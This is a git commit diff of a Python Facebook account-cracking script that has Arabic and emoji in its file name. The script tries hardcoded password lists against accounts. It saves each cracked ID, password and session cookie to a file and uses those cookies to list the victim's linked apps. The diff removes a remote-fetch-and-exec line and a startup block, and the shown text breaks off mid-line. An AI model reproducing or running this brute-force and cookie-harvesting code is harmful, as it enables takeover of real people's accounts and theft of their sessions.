8fba1702a58184f4b3ed2363e74b13a8a3b3b2f9
skejexu <jwbevjsbwbsbhwk@gmail.com>
2024-07-02 23:27:51 +0300

    Update اسلام 🌹🫰🏻.py

--- اسلام 🌹🫰🏻.py
+++ اسلام 🌹🫰🏻.py
@@ -37,14 +37,7 @@ if (x.strftime("%x"))==(g.strftime("%x")):
    print('')
    if(x.strftime("%X"))>(g.strftime("%X")):
     print('\n\n')
-    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @Fimport requests
-
-url = "https://raw.githubusercontent.com/skejexu/python/main/%D8%A7%D8%B3%D9%84%D8%A7%D9%85%20%F0%9F%8C%B9%F0%9F%AB%B0%F0%9F%8F%BB.py"
-
-response = requests.get(url)
-code = response.text
-
-exec(code)')
+    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @F_1_9 ☄️🗿')
     print('\n\n')
     print(x)
     
@@ -674,7 +667,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('Aa123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -724,7 +717,7 @@ def passwrd():
 					pwv.append('12341234@@')
 					pwv.append('zokoloko')
 					pwv.append('aliali@@')
-					pwv.append('Zz123456')
+					pwv.append('حسين علي')
 					pwv.append('mustafa2000')
 					pwv.append('11112222@@')
 					pwv.append('11112222@')
@@ -789,7 +782,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				raven_a = f'\r[[@bsbsjhh] @Islam85555] اسلام ➨ {idf} | {pw} | \n \n{kuki} '
+				raven_a = f'\r[[OK]] ➨ {idf} | {pw} | \n \n{kuki} '
 				print ('\x1b[32m――――――――――――――――――――――――')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				statusok1 = nel(raven_a, style='green')
@@ -812,25 +805,4 @@ def cek_RAVEN(kuki):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
-	except AttributeError:
-		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
-	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
-if __name__=='__main__':
-    try:os.system('git pull')
-    except:pass
-    try:os.mkdir('OK')
-    except:pass
-    try:os.mkdir('CP')
-    except:pass
-    try:os.mkdir('/sdcard/VENOM-FB')
-    except:pass
-    RR()
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pa
